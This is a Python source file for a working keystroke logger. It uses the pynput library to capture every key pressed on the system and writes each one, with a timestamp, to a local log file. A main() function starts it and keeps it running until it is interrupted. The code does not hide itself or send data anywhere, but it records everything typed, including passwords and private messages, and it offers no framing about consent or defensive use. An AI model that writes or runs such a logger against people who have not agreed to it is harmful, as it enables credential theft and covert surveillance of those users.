import logging
import os
import sys
import pynput.keyboard

class KeystrokeLogger:
    def __init__(self, log_file='keystrokes.log'):
        """
        Initialize the keystroke logger.
        
        :param log_file: Path to the log file where keystrokes will be recorded
        """
        # Ensure the logs directory exists
        os.makedirs('logs', exist_ok=True)
        self.log_file = os.path.join('logs', log_file)
        
        # Configure logging
        logging.basicConfig(
            filename=self.log_file, 
            level=logging.INFO, 
            format='%(asctime)s - %(message)s'
        )
        
        # Keyboard listener
        self.listener = None
        
    def _on_press(self, key):
        """
        Callback for key press events.
        
        :param key: The key that was pressed
        """
        try:
            # Try to log the character for printable keys
            log_key = key.char
        except AttributeError:
            # For special keys, use their string representation
            log_key = str(key)
        
        # Log the pressed key
        logging.info(f"Key pressed: {log_key}")
    
    def start(self):
        """
        Start listening and logging keystrokes.
        """
        # Create and start the listener
        self.listener = pynput.keyboard.Listener(on_press=self._on_press)
        self.listener.start()
        logging.info("Keystroke logging started.")
    
    def stop(self):
        """
        Stop listening and logging keystrokes.
        """
        if self.listener:
            self.listener.stop()
            logging.info("Keystroke logging stopped.")
            self.listener = None

def main():
    """
    Example usage of the KeystrokeLogger.
    """
    logger = KeystrokeLogger()
    logger.start()
    
    try:
        # Keep the script running
        logger.listener.join()
    except KeyboardInterrupt:
        logger.stop()

if __name__ == "__main__":
    main()